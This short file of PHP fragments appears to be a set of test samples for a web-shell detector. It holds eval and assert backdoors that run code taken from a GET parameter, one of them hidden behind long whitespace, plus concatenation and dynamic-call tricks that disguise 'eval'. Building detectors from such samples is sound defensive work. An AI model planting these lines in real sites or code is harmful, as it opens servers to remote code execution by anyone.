<?php@eval($_GET['p'])
<?php                                                                                                                                                assert (    $_GET['p']
)
$func="test";$b374k=$func('$x', 'ev'.'al')
$b=$W('',$S);$b();
;$pouet($pif,$paf);
${$pouet}
'pouet'.'pif' . 'pouet' . "lol" ."kwainkwain"
